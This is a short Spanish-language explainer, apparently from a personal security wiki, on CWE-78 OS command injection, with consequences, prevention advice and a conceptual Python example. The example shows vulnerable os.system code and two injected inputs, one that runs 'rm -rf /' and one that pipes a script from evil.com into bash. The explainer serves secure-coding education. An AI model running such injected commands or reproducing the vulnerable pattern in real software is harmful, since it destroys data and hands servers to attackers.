**CWE-78** representa la falta de control en el ingreso de datos del usuario que permite la **ejecución de comandos arbitrarios en el sistema operativo**.

## Descripción

La aplicación construye comandos del sistema operativo concatenando directamente el input del usuario. Un atacante puede inyectar comandos adicionales que el sistema ejecutará con los privilegios del proceso de la aplicación.

## Consecuencias

- Ejecución arbitraria de comandos en el servidor.
- Escalada de privilegios si el proceso corre como root.
- Exfiltración de archivos del sistema.
- Instalación de backdoors o malware.
- Acceso completo al servidor si el proceso tiene privilegios altos.

## Ejemplo conceptual

```python
# Código vulnerable
filename = request.args.get('file')
os.system(f"cat /uploads/{filename}")

# Input del atacante:
# file=report.txt; rm -rf /
# file=report.txt; curl http://evil.com/shell.sh | bash
```

## Prevención

- **Nunca** construir comandos del sistema concatenando input del usuario.
- Usar APIs de lenguaje de alto nivel en lugar de llamadas al shell.
- Si es necesario ejecutar comandos, usar listas de argumentos (no strings) y evitar el shell.
- Aplicar [[Least Privilege]]: el proceso no debería correr como root.
- Validar y filtrar estrictamente el input del usuario.

## Relación con otros conceptos

- [[Least Privilege]]: un proceso con mínimos privilegios limita el daño de una inyección exitosa.
- [[CWE-89 - SQL Injection]]: vulnerabilidad análoga en bases de datos.

## Referencia

https://cwe.mitre.org/data/definitions/78.html
